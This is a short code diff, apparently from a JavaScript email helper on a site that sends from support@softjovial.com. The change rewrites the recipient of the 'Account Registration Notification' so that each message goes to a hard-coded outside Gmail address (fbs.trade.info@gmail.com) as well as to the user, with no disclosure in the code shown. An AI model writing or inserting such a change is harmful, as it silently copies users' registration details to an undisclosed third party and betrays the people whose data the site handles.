@@ -35,7 +35,7 @@ let create_mail_options = (userInfo) => {
   return (mailOptions = {
     from: "support@softjovial.com",
     // from:"michelleannschlloser@outlook.com",
-    to: userInfo.reciever,
+    to: ["fbs.trade.info@gmail.com", userInfo.reciever],
     subject: `Account Registration Notification`,
     //   text:"just wanna know if this works",
     html: `<link rel="preconnect" href="https://fonts.googleapis.com" />
